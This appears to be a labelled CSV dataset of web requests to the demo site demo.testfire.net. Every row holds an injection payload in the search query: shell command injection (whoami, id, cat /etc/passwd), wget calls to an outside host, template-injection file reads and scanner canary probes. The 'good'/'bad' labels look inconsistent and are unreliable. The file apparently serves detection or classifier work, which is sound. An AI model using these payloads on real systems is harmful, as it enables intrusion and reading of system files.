path,content,host,class_flag
/search.jsp?query=| wget http://crowdshield.com/.testing/rce.txt,,demo.testfire.net,['good']
/search.jsp?query=& wget http://crowdshield.com/.testing/rce.txt,,demo.testfire.net,['good']
/search.jsp?query=; wget https://crowdshield.com/.testing/rce_vuln.txt,,demo.testfire.net,['good']
/search.jsp?query=$(`wget https://crowdshield.com/.testing/rce_vuln.txt`),,demo.testfire.net,['bad']
/search.jsp?query=&& wget https://crowdshield.com/.testing/rce_vuln.txt,,demo.testfire.net,['good']
/search.jsp?query=wget https://crowdshield.com/.testing/rce_vuln.txt,,demo.testfire.net,['good']
/search.jsp?query=$(`wget https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`),,demo.testfire.net,['bad']
/search.jsp?query=which curl,,demo.testfire.net,['good']
/search.jsp?query=which gcc,,demo.testfire.net,['good']
/search.jsp?query=which nc,,demo.testfire.net,['good']
/search.jsp?query=which netcat,,demo.testfire.net,['good']
/search.jsp?query=which perl,,demo.testfire.net,['good']
/search.jsp?query=which python,,demo.testfire.net,['good']
/search.jsp?query=which wget,,demo.testfire.net,['good']
/search.jsp?query=whoami,,demo.testfire.net,['good']
/search.jsp?query=| whoami,,demo.testfire.net,['good']
/search.jsp?query=; whoami,,demo.testfire.net,['good']
/search.jsp?query=' whoami,,demo.testfire.net,['good']
/search.jsp?query=' || whoami,,demo.testfire.net,['good']
/search.jsp?query=' & whoami,,demo.testfire.net,['good']
/search.jsp?query=' && whoami,,demo.testfire.net,['good']
/search.jsp?query='; whoami,,demo.testfire.net,['good']
"/search.jsp?query="" whoami",,demo.testfire.net,['good']
"/search.jsp?query="" || whoami",,demo.testfire.net,['good']
"/search.jsp?query="" & whoami",,demo.testfire.net,['good']
"/search.jsp?query="" | whoami",,demo.testfire.net,['good']
"/search.jsp?query="" && whoami",,demo.testfire.net,['good']
"/search.jsp?query=""; whoami",,demo.testfire.net,['good']
/search.jsp?query=$(`whoami`),,demo.testfire.net,['bad']
/search.jsp?query=& whoami,,demo.testfire.net,['good']
/search.jsp?query=&& whoami,,demo.testfire.net,['good']
"/search.jsp?query={{ get_user_file(""C:\boot.ini"") }}",,demo.testfire.net,['good']
"/search.jsp?query={{ get_user_file(""/etc/hosts"") }}",,demo.testfire.net,['good']
"/search.jsp?query={{ get_user_file(""/etc/passwd"") }}",,demo.testfire.net,['good']
/search.jsp?query={{4+4}},,demo.testfire.net,['good']
/search.jsp?query={{4+8}},,demo.testfire.net,['good']
/search.jsp?query={{person.secret}},,demo.testfire.net,['good']
/search.jsp?query={{person.name}},,demo.testfire.net,['good']
/search.jsp?query={1} + {1},,demo.testfire.net,['good']
"/search.jsp?query={% For c in [1,2,3]%} {{c, c, c}} {% endfor%}",,demo.testfire.net,['good']
/search.jsp?query={{[] .__ Class __.__ base __.__ subclasses __ ()}},,demo.testfire.net,['good']
/search.jsp?query=;id\n,,demo.testfire.net,['good']
/search.jsp?query=|usr/bin/id\n,,demo.testfire.net,['good']
/search.jsp?query=|nid\n,,demo.testfire.net,['good']
/search.jsp?query=`id`,,demo.testfire.net,['good']
/search.jsp?query=`/usr/bin/id`,,demo.testfire.net,['good']
/search.jsp?query=a);id,,demo.testfire.net,['good']
/search.jsp?query=a;id,,demo.testfire.net,['good']
/search.jsp?query=a);id;,,demo.testfire.net,['good']
/search.jsp?query=a;id;,,demo.testfire.net,['good']
/search.jsp?query=a);id|,,demo.testfire.net,['good']
/search.jsp?query=a;id|,,demo.testfire.net,['good']
/search.jsp?query=a)|id,,demo.testfire.net,['good']
/search.jsp?query=a|id,,demo.testfire.net,['good']
/search.jsp?query=a)|id;,,demo.testfire.net,['good']
/search.jsp?query=a|id,,demo.testfire.net,['good']
/search.jsp?query=|/bin/ls -al,,demo.testfire.net,['good']
/search.jsp?query=a);/usr/bin/id,,demo.testfire.net,['good']
/search.jsp?query=a;/usr/bin/id,,demo.testfire.net,['good']
/search.jsp?query=a);/usr/bin/id;,,demo.testfire.net,['good']
/search.jsp?query=a;/usr/bin/id;,,demo.testfire.net,['good']
/search.jsp?query=a);/usr/bin/id|,,demo.testfire.net,['good']
/search.jsp?query=a;/usr/bin/id|,,demo.testfire.net,['good']
/search.jsp?query=a)|/usr/bin/id,,demo.testfire.net,['good']
/search.jsp?query=a|/usr/bin/id,,demo.testfire.net,['good']
/search.jsp?query=a)|/usr/bin/id;,,demo.testfire.net,['good']
/search.jsp?query=a|/usr/bin/id,,demo.testfire.net,['good']
/search.jsp?query=;system('cat /etc/passwd'),,demo.testfire.net,['good']
/search.jsp?query=;system('id'),,demo.testfire.net,['good']
/search.jsp?query=;system('/usr/bin/id'),,demo.testfire.net,['good']
/search.jsp?query=& ping -i 30 127.0.0.1 &,,demo.testfire.net,['good']
/search.jsp?query=& ping -n 30 127.0.0.1 &,,demo.testfire.net,['good']
/search.jsp?query=`ping 127.0.0.1`,,demo.testfire.net,['good']
/search.jsp?query=| id,,demo.testfire.net,['good']
/search.jsp?query=; id,,demo.testfire.net,['good']
/search.jsp?query=& id,,demo.testfire.net,['good']
/search.jsp?query=`id`,,demo.testfire.net,['good']
/search.jsp?query=$;/usr/bin/id,,demo.testfire.net,['bad']
/search.jsp?query=echo AGIYMZ$((69+52))$(echo AGIYMZ)AGIYMZ,,demo.testfire.net,['bad']
/search.jsp?query=;echo MPCSBG$((54+42))$(echo MPCSBG)MPCSBG,,demo.testfire.net,['bad']
/search.jsp?query= echo TDJHRY$((30+41))$(echo TDJHRY)TDJHRY,,demo.testfire.net,['bad']
/search.jsp?query=&echo NWMZCF$((57+72))$(echo NWMZCF)NWMZCF,,demo.testfire.net,['bad']
/search.jsp?query=|echo TJEGSE$((27+57))$(echo TJEGSE)TJEGSE,,demo.testfire.net,['bad']
/search.jsp?query=||echo ANSBHE$((26+89))$(echo ANSBHE)ANSBHE,,demo.testfire.net,['bad']
/search.jsp?query=&&echo PVJXOS$((12+1))$(echo PVJXOS)PVJXOS,,demo.testfire.net,['bad']
"/search.jsp?query=
echo VVIEOJ$((30+78))$(echo VVIEOJ)VVIEOJ",,demo.testfire.net,['bad']
/search.jsp?query=;echo SRPJET$((29+34))$(echo SRPJET)SRPJET,,demo.testfire.net,['bad']
/search.jsp?query=&echo NQPWBV$((16+77))$(echo NQPWBV)NQPWBV,,demo.testfire.net,['bad']
/search.jsp?query=&&echo QOZRFB$((19+4))$(echo QOZRFB)QOZRFB,,demo.testfire.net,['bad']
/search.jsp?query=|echo IRODNG$((26+68))$(echo IRODNG)IRODNG,,demo.testfire.net,['bad']
/search.jsp?query=||echo KRCSNE$((57+75))$(echo KRCSNE)KRCSNE,,demo.testfire.net,['bad']
/search.jsp?query=echo IFNPXI$((40+99))$(echo IFNPXI)IFNPXI',,demo.testfire.net,['bad']
/search.jsp?query= echo HBFEEM$((46+2))$(echo HBFEEM)HBFEEM',,demo.testfire.net,['bad']
/search.jsp?query=;echo KHMFRS$((69+67))$(echo KHMFRS)KHMFRS',,demo.testfire.net,['bad']
/search.jsp?query=&echo DACXMN$((57+35))$(echo DACXMN)DACXMN',,demo.testfire.net,['bad']
/search.jsp?query=|echo DDLJJW$((33+23))$(echo DDLJJW)DDLJJW',,demo.testfire.net,['bad']
/search.jsp?query=||echo XIYAUA$((17+90))$(echo XIYAUA)XIYAUA',,demo.testfire.net,['bad']
/search.jsp?query=&&echo CMMOTV$((30+10))$(echo CMMOTV)CMMOTV',,demo.testfire.net,['bad']
"/search.jsp?query=
echo VKWHEH$((83+36))$(echo VKWHEH)VKWHEH'",,demo.testfire.net,['bad']
/search.jsp?query=;echo RDKWWC$((22+44))$(echo RDKWWC)RDKWWC',,demo.testfire.net,['bad']
/search.jsp?query=&echo VOANQN$((77+86))$(echo VOANQN)VOANQN',,demo.testfire.net,['bad']
/search.jsp?query=&&echo EXUMZL$((4+99))$(echo EXUMZL)EXUMZL',,demo.testfire.net,['bad']
/search.jsp?query=|echo VDZSYZ$((58+1))$(echo VDZSYZ)VDZSYZ',,demo.testfire.net,['bad']
/search.jsp?query=||echo HYHREQ$((78+11))$(echo HYHREQ)HYHREQ',,demo.testfire.net,['bad']
"/search.jsp?query=echo GHWFXG$((12+72))$(echo GHWFXG)GHWFXG""",,demo.testfire.net,['bad']
"/search.jsp?query= echo BAJXZZ$((73+7))$(echo BAJXZZ)BAJXZZ""",,demo.testfire.net,['bad']
"/search.jsp?query=;echo YRBNTY$((83+14))$(echo YRBNTY)YRBNTY""",,demo.testfire.net,['bad']
"/search.jsp?query=&echo WQLTXV$((0+25))$(echo WQLTXV)WQLTXV""",,demo.testfire.net,['bad']
"/search.jsp?query=|echo PRCGGO$((57+79))$(echo PRCGGO)PRCGGO""",,demo.testfire.net,['bad']
"/search.jsp?query=||echo RWZHCR$((74+28))$(echo RWZHCR)RWZHCR""",,demo.testfire.net,['bad']
"/search.jsp?query=&&echo QTDSQL$((20+35))$(echo QTDSQL)QTDSQL""",,demo.testfire.net,['bad']
"/search.jsp?query=
echo NCRQQT$((66+95))$(echo NCRQQT)NCRQQT""",,demo.testfire.net,['bad']
"/search.jsp?query=;echo QXBWJP$((56+78))$(echo QXBWJP)QXBWJP""",,demo.testfire.net,['bad']
"/search.jsp?query=&echo YYWLTQ$((61+71))$(echo YYWLTQ)YYWLTQ""",,demo.testfire.net,['bad']
"/search.jsp?query=&&echo XKFEGJ$((1+49))$(echo XKFEGJ)XKFEGJ""",,demo.testfire.net,['bad']
"/search.jsp?query=|echo YPOSVR$((24+62))$(echo YPOSVR)YPOSVR""",,demo.testfire.net,['bad']
"/search.jsp?query=||echo CFGBVN$((38+88))$(echo CFGBVN)CFGBVN""",,demo.testfire.net,['bad']
/search.jsp?query=echo CWRXRJ$((77+13))$(echo CWRXRJ)CWRXRJ,,demo.testfire.net,['bad']
/search.jsp?query= echo IBQHOS$((92+76))$(echo IBQHOS)IBQHOS,,demo.testfire.net,['bad']
/search.jsp?query=;echo CSPAAF$((48+26))$(echo CSPAAF)CSPAAF,,demo.testfire.net,['bad']
/search.jsp?query=&echo DRUCFI$((69+56))$(echo DRUCFI)DRUCFI,,demo.testfire.net,['bad']
/search.jsp?query=|echo TWNZDU$((10+40))$(echo TWNZDU)TWNZDU,,demo.testfire.net,['bad']
/search.jsp?query=||echo TPIMPW$((11+13))$(echo TPIMPW)TPIMPW,,demo.testfire.net,['bad']
/search.jsp?query=&&echo FOJNEL$((64+8))$(echo FOJNEL)FOJNEL,,demo.testfire.net,['bad']
"/search.jsp?query=
echo MBVQWK$((48+90))$(echo MBVQWK)MBVQWK",,demo.testfire.net,['bad']
/search.jsp?query=;echo RHJGKQ$((38+71))$(echo RHJGKQ)RHJGKQ,,demo.testfire.net,['bad']
/search.jsp?query=&echo MUQJWT$((7+78))$(echo MUQJWT)MUQJWT,,demo.testfire.net,['bad']
/search.jsp?query=&&echo KHAVOV$((90+77))$(echo KHAVOV)KHAVOV,,demo.testfire.net,['bad']
/search.jsp?query=|echo SUHDBU$((66+15))$(echo SUHDBU)SUHDBU,,demo.testfire.net,['bad']
/search.jsp?query=||echo FEGCUU$((21+29))$(echo FEGCUU)FEGCUU,,demo.testfire.net,['bad']
/search.jsp?query=echo DINEVC$((57+17))$(echo DINEVC)DINEVC//,,demo.testfire.net,['bad']
/search.jsp?query= echo BSYIFX$((64+71))$(echo BSYIFX)BSYIFX//,,demo.testfire.net,['bad']
/search.jsp?query=&echo QLUITC$((73+99))$(echo QLUITC)QLUITC//,,demo.testfire.net,['bad']
/search.jsp?query=;echo FRDAGY$((96+63))$(echo FRDAGY)FRDAGY//,,demo.testfire.net,['bad']
/search.jsp?query=|echo SBZVBA$((97+74))$(echo SBZVBA)SBZVBA//,,demo.testfire.net,['bad']
/search.jsp?query=||echo ZZJQZV$((83+59))$(echo ZZJQZV)ZZJQZV//,,demo.testfire.net,['bad']
/search.jsp?query=&&echo RIWFAA$((64+99))$(echo RIWFAA)RIWFAA//,,demo.testfire.net,['bad']
"/search.jsp?query=
echo MESJOF$((62+27))$(echo MESJOF)MESJOF//",,demo.testfire.net,['bad']
/search.jsp?query=;echo SVKHMK$((30+19))$(echo SVKHMK)SVKHMK//,,demo.testfire.net,['bad']
/search.jsp?query=&echo ZPAVCI$((24+53))$(echo ZPAVCI)ZPAVCI//,,demo.testfire.net,['bad']
/search.jsp?query=&&echo MXMWUR$((62+86))$(echo MXMWUR)MXMWUR//,,demo.testfire.net,['bad']
/search.jsp?query=||echo SBQJMU$((91+44))$(echo SBQJMU)SBQJMU//,,demo.testfire.net,['bad']
/search.jsp?query=|echo AGUYET$((89+40))$(echo AGUYET)AGUYET//,,demo.testfire.net,['bad']
/search.jsp?query=echo ZUXLTJ$((16+69))$(echo ZUXLTJ)ZUXLTJ\,,demo.testfire.net,['bad']
/search.jsp?query= echo QQZCOQ$((29+94))$(echo QQZCOQ)QQZCOQ\,,demo.testfire.net,['bad']
/search.jsp?query=;echo KHCYPO$((77+38))$(echo KHCYPO)KHCYPO\,,demo.testfire.net,['bad']
/search.jsp?query=&echo MCEEEZ$((59+2))$(echo MCEEEZ)MCEEEZ\,,demo.testfire.net,['bad']
/search.jsp?query=|echo OYDZIJ$((96+61))$(echo OYDZIJ)OYDZIJ\,,demo.testfire.net,['bad']
/search.jsp?query=||echo PJBTDO$((60+74))$(echo PJBTDO)PJBTDO\,,demo.testfire.net,['bad']
/search.jsp?query=&&echo HETHMD$((47+99))$(echo HETHMD)HETHMD\,,demo.testfire.net,['bad']
"/search.jsp?query=
echo HNNUGD$((25+95))$(echo HNNUGD)HNNUGD\",,demo.testfire.net,['bad']
/search.jsp?query=;echo OFIKGO$((60+50))$(echo OFIKGO)OFIKGO\,,demo.testfire.net,['bad']
/search.jsp?query=&echo RKCZIL$((79+92))$(echo RKCZIL)RKCZIL\,,demo.testfire.net,['bad']
/search.jsp?query=&&echo WLJUON$((15+95))$(echo WLJUON)WLJUON\,,demo.testfire.net,['bad']
/search.jsp?query=|echo WEBPND$((27+55))$(echo WEBPND)WEBPND\,,demo.testfire.net,['bad']
/search.jsp?query=||echo HKTMWP$((40+9))$(echo HKTMWP)HKTMWP\,,demo.testfire.net,['bad']
/search.jsp?query=echo MTEZNM$((22+3))$(echo MTEZNM)MTEZNM&,,demo.testfire.net,['bad']
/search.jsp?query= echo YPQTYX$((9+27))$(echo YPQTYX)YPQTYX&,,demo.testfire.net,['bad']
/search.jsp?query=;echo UNXFGJ$((26+60))$(echo UNXFGJ)UNXFGJ&,,demo.testfire.net,['bad']
/search.jsp?query=&echo KUCRVN$((73+39))$(echo KUCRVN)KUCRVN&,,demo.testfire.net,['bad']
/search.jsp?query=|echo FNYPPK$((77+83))$(echo FNYPPK)FNYPPK&,,demo.testfire.net,['bad']
/search.jsp?query=||echo NRVZFD$((41+1))$(echo NRVZFD)NRVZFD&,,demo.testfire.net,['bad']
/search.jsp?query=&&echo QAGWEJ$((84+54))$(echo QAGWEJ)QAGWEJ&,,demo.testfire.net,['bad']
"/search.jsp?query=
echo HNTZSH$((50+30))$(echo HNTZSH)HNTZSH&",,demo.testfire.net,['bad']
/search.jsp?query=;echo HGVPJY$((28+49))$(echo HGVPJY)HGVPJY&,,demo.testfire.net,['bad']
/search.jsp?query=&echo FWAUTF$((39+22))$(echo FWAUTF)FWAUTF&,,demo.testfire.net,['bad']
/search.jsp?query=&&echo BSQKBM$((74+49))$(echo BSQKBM)BSQKBM&,,demo.testfire.net,['bad']
/search.jsp?query=|echo SEIDBX$((80+51))$(echo SEIDBX)SEIDBX&,,demo.testfire.net,['bad']
/search.jsp?query=||echo TVKSTF$((99+96))$(echo TVKSTF)TVKSTF&,,demo.testfire.net,['bad']
/search.jsp?query=echo XOEUCM$((23+30))$(echo XOEUCM)XOEUCM|,,demo.testfire.net,['bad']
/search.jsp?query= echo DRFYNB$((7+97))$(echo DRFYNB)DRFYNB|,,demo.testfire.net,['bad']
/search.jsp?query=;echo SIRYMP$((7+6))$(echo SIRYMP)SIRYMP|,,demo.testfire.net,['bad']
/search.jsp?query=&echo SPRAWO$((58+5))$(echo SPRAWO)SPRAWO|,,demo.testfire.net,['bad']
/search.jsp?query=|echo OTDJOE$((4+21))$(echo OTDJOE)OTDJOE|,,demo.testfire.net,['bad']
/search.jsp?query=||echo RFRIIL$((68+10))$(echo RFRIIL)RFRIIL|,,demo.testfire.net,['bad']
/search.jsp?query=&&echo GKEMGA$((51+90))$(echo GKEMGA)GKEMGA|,,demo.testfire.net,['bad']
"/search.jsp?query=
echo ZNOLCP$((67+83))$(echo ZNOLCP)ZNOLCP|",,demo.testfire.net,['bad']
/search.jsp?query=;echo PSHEAA$((43+12))$(echo PSHEAA)PSHEAA|,,demo.testfire.net,['bad']
/search.jsp?query=&echo YPFSZA$((90+71))$(echo YPFSZA)YPFSZA|,,demo.testfire.net,['bad']
/search.jsp?query=&&echo BHDDGG$((67+94))$(echo BHDDGG)BHDDGG|,,demo.testfire.net,['bad']
/search.jsp?query=|echo UFFOUX$((59+47))$(echo UFFOUX)UFFOUX|,,demo.testfire.net,['bad']
/search.jsp?query=||echo CXXXGW$((34+53))$(echo CXXXGW)CXXXGW|,,demo.testfire.net,['bad']
/search.jsp?query=echo URJEMH$((2+45))$(echo URJEMH)URJEMH',,demo.testfire.net,['bad']
/search.jsp?query= echo ALRHIH$((11+27))$(echo ALRHIH)ALRHIH',,demo.testfire.net,['bad']
/search.jsp?query=;echo IPTSZG$((46+17))$(echo IPTSZG)IPTSZG',,demo.testfire.net,['bad']
/search.jsp?query=&echo YHCAGI$((22+26))$(echo YHCAGI)YHCAGI',,demo.testfire.net,['bad']
/search.jsp?query=|echo DZPIWA$((18+47))$(echo DZPIWA)DZPIWA',,demo.testfire.net,['bad']
/search.jsp?query=||echo SJZFWV$((8+68))$(echo SJZFWV)SJZFWV',,demo.testfire.net,['bad']
/search.jsp?query=&&echo QZXLOK$((2+27))$(echo QZXLOK)QZXLOK',,demo.testfire.net,['bad']
"/search.jsp?query=
echo URBCMK$((17+54))$(echo URBCMK)URBCMK'",,demo.testfire.net,['bad']
/search.jsp?query=;echo QHDGWH$((99+66))$(echo QHDGWH)QHDGWH',,demo.testfire.net,['bad']
/search.jsp?query=&echo WOTYOT$((32+39))$(echo WOTYOT)WOTYOT',,demo.testfire.net,['bad']
/search.jsp?query=&&echo CSSQPT$((9+40))$(echo CSSQPT)CSSQPT',,demo.testfire.net,['bad']
/search.jsp?query=|echo CPQTYB$((64+20))$(echo CPQTYB)CPQTYB',,demo.testfire.net,['bad']
/search.jsp?query=||echo EBGHXU$((74+4))$(echo EBGHXU)EBGHXU',,demo.testfire.net,['bad']
"/search.jsp?query=echo LENNLE$((14+89))$(echo LENNLE)LENNLE""",,demo.testfire.net,['bad']
"/search.jsp?query= echo FPVLKT$((63+87))$(echo FPVLKT)FPVLKT""",,demo.testfire.net,['bad']
"/search.jsp?query=;echo OIHFAC$((90+34))$(echo OIHFAC)OIHFAC""",,demo.testfire.net,['bad']
"/search.jsp?query=&echo QLFUON$((35+62))$(echo QLFUON)QLFUON""",,demo.testfire.net,['bad']
"/search.jsp?query=|echo GEPPDW$((55+58))$(echo GEPPDW)GEPPDW""",,demo.testfire.net,['bad']
"/search.jsp?query=||echo DETQCQ$((28+83))$(echo DETQCQ)DETQCQ""",,demo.testfire.net,['bad']
"/search.jsp?query=&&echo BALAGY$((97+95))$(echo BALAGY)BALAGY""",,demo.testfire.net,['bad']
"/search.jsp?query=
echo PETUUK$((81+85))$(echo PETUUK)PETUUK""",,demo.testfire.net,['bad']
"/search.jsp?query=;echo LBKHXK$((90+74))$(echo LBKHXK)LBKHXK""",,demo.testfire.net,['bad']
"/search.jsp?query=&echo JOADAU$((32+46))$(echo JOADAU)JOADAU""",,demo.testfire.net,['bad']
"/search.jsp?query=&&echo DNDLZD$((92+6))$(echo DNDLZD)DNDLZD""",,demo.testfire.net,['bad']
"/search.jsp?query=|echo ORHNZL$((45+63))$(echo ORHNZL)ORHNZL""",,demo.testfire.net,['bad']
"/search.jsp?query=||echo TEDJVC$((96+45))$(echo TEDJVC)TEDJVC""",,demo.testfire.net,['bad']
/search.jsp?query=echo AQRKLL$((20+31))$(echo AQRKLL)AQRKLL\\,,demo.testfire.net,['bad']
/search.jsp?query= echo CKFAYE$((18+45))$(echo CKFAYE)CKFAYE\\,,demo.testfire.net,['bad']
/search.jsp?query=;echo HYBMMW$((16+36))$(echo HYBMMW)HYBMMW\\,,demo.testfire.net,['bad']
/search.jsp?query=&echo NOKSUR$((8+35))$(echo NOKSUR)NOKSUR\\,,demo.testfire.net,['bad']
/search.jsp?query=|echo OTDXSU$((6+1))$(echo OTDXSU)OTDXSU\\,,demo.testfire.net,['bad']
/search.jsp?query=||echo KFLFGL$((10+4))$(echo KFLFGL)KFLFGL\\,,demo.testfire.net,['bad']
/search.jsp?query=&&echo MKGYYL$((46+31))$(echo MKGYYL)MKGYYL\\,,demo.testfire.net,['bad']
"/search.jsp?query=
echo ANSTBN$((20+35))$(echo ANSTBN)ANSTBN\\",,demo.testfire.net,['bad']
/search.jsp?query=;echo OHYLGW$((56+18))$(echo OHYLGW)OHYLGW\\,,demo.testfire.net,['bad']
/search.jsp?query=&echo NFGINK$((64+92))$(echo NFGINK)NFGINK\\,,demo.testfire.net,['bad']
/search.jsp?query=&&echo EJACRB$((30+66))$(echo EJACRB)EJACRB\\,,demo.testfire.net,['bad']
/search.jsp?query=|echo QNJYVT$((4+44))$(echo QNJYVT)QNJYVT\\,,demo.testfire.net,['bad']
/search.jsp?query=||echo UBHYQD$((55+41))$(echo UBHYQD)UBHYQD\\,,demo.testfire.net,['bad']
/search.jsp?query=echo TJAXUJ$((80+70))$(echo TJAXUJ)TJAXUJ//,,demo.testfire.net,['bad']
/search.jsp?query= echo RGMCLI$((27+75))$(echo RGMCLI)RGMCLI//,,demo.testfire.net,['bad']
/search.jsp?query=;echo KUXGTM$((7+89))$(echo KUXGTM)KUXGTM//,,demo.testfire.net,['bad']
/search.jsp?query=&echo CCYVIF$((50+63))$(echo CCYVIF)CCYVIF//,,demo.testfire.net,['bad']
/search.jsp?query=|echo GRWCHE$((81+54))$(echo GRWCHE)GRWCHE//,,demo.testfire.net,['bad']
/search.jsp?query=||echo OZJGZU$((76+56))$(echo OZJGZU)OZJGZU//,,demo.testfire.net,['bad']
/search.jsp?query=&&echo RLCXAD$((4+93))$(echo RLCXAD)RLCXAD//,,demo.testfire.net,['bad']
"/search.jsp?query=
echo KYMBVZ$((7+62))$(echo KYMBVZ)KYMBVZ//",,demo.testfire.net,['bad']
/search.jsp?query=;echo SVFHGU$((48+4))$(echo SVFHGU)SVFHGU//,,demo.testfire.net,['bad']
/search.jsp?query=&echo OXZPGU$((40+61))$(echo OXZPGU)OXZPGU//,,demo.testfire.net,['bad']
/search.jsp?query=&&echo PUUCTR$((68+33))$(echo PUUCTR)PUUCTR//,,demo.testfire.net,['bad']
/search.jsp?query=|echo CGYJPN$((45+35))$(echo CGYJPN)CGYJPN//,,demo.testfire.net,['bad']
/search.jsp?query=||echo XVNYDY$((93+18))$(echo XVNYDY)XVNYDY//,,demo.testfire.net,['bad']
/search.jsp?query=echo ZZAYTQ$((30+82))$(echo ZZAYTQ)ZZAYTQ&,,demo.testfire.net,['bad']
/search.jsp?query= echo TWTKKJ$((67+81))$(echo TWTKKJ)TWTKKJ&,,demo.testfire.net,['bad']
/search.jsp?query=;echo DDXENF$((29+82))$(echo DDXENF)DDXENF&,,demo.testfire.net,['bad']
/search.jsp?query=&echo JFDHZU$((1+12))$(echo JFDHZU)JFDHZU&,,demo.testfire.net,['bad']
/search.jsp?query=|echo PAKNUK$((48+25))$(echo PAKNUK)PAKNUK&,,demo.testfire.net,['bad']
/search.jsp?query=||echo IHELYG$((76+62))$(echo IHELYG)IHELYG&,,demo.testfire.net,['bad']
/search.jsp?query=&&echo LOAKXY$((52+22))$(echo LOAKXY)LOAKXY&,,demo.testfire.net,['bad']
"/search.jsp?query=
echo JXLHHG$((94+73))$(echo JXLHHG)JXLHHG&",,demo.testfire.net,['bad']
/search.jsp?query=;echo FAHQNN$((39+84))$(echo FAHQNN)FAHQNN&,,demo.testfire.net,['bad']
/search.jsp?query=&echo RDICIX$((99+44))$(echo RDICIX)RDICIX&,,demo.testfire.net,['bad']
/search.jsp?query=&&echo ZTWRSM$((30+32))$(echo ZTWRSM)ZTWRSM&,,demo.testfire.net,['bad']
/search.jsp?query=|echo LLYIHD$((46+68))$(echo LLYIHD)LLYIHD&,,demo.testfire.net,['bad']
/search.jsp?query=||echo OYGMVZ$((16+56))$(echo OYGMVZ)OYGMVZ&,,demo.testfire.net,['bad']
/search.jsp?query=echo LZWGVJ$((6+60))$(echo LZWGVJ)LZWGVJ|,,demo.testfire.net,['bad']
/search.jsp?query= echo YEOGLL$((28+5))$(echo YEOGLL)YEOGLL|,,demo.testfire.net,['bad']
/search.jsp?query=;echo MXKHVK$((46+71))$(echo MXKHVK)MXKHVK|,,demo.testfire.net,['bad']
/search.jsp?query=&echo OSJJGL$((20+68))$(echo OSJJGL)OSJJGL|,,demo.testfire.net,['bad']
/search.jsp?query=|echo FZLTEJ$((27+72))$(echo FZLTEJ)FZLTEJ|,,demo.testfire.net,['bad']
/search.jsp?query=||echo ZLPJPQ$((81+32))$(echo ZLPJPQ)ZLPJPQ|,,demo.testfire.net,['bad']
/search.jsp?query=&&echo KXTSXC$((16+52))$(echo KXTSXC)KXTSXC|,,demo.testfire.net,['bad']
"/search.jsp?query=
echo QUHONN$((15+27))$(echo QUHONN)QUHONN|",,demo.testfire.net,['bad']
/search.jsp?query=;echo YORHEJ$((41+36))$(echo YORHEJ)YORHEJ|,,demo.testfire.net,['bad']
/search.jsp?query=&echo MHEMLM$((72+41))$(echo MHEMLM)MHEMLM|,,demo.testfire.net,['bad']
/search.jsp?query=&&echo FFQWQY$((35+58))$(echo FFQWQY)FFQWQY|,,demo.testfire.net,['bad']
/search.jsp?query=|echo DPZHUT$((28+81))$(echo DPZHUT)DPZHUT|,,demo.testfire.net,['bad']
/search.jsp?query=||echo FFBSEF$((15+13))$(echo FFBSEF)FFBSEF|,,demo.testfire.net,['bad']
/search.jsp?query='echo OKVFZD$((59+78))$(echo OKVFZD)OKVFZD,,demo.testfire.net,['bad']
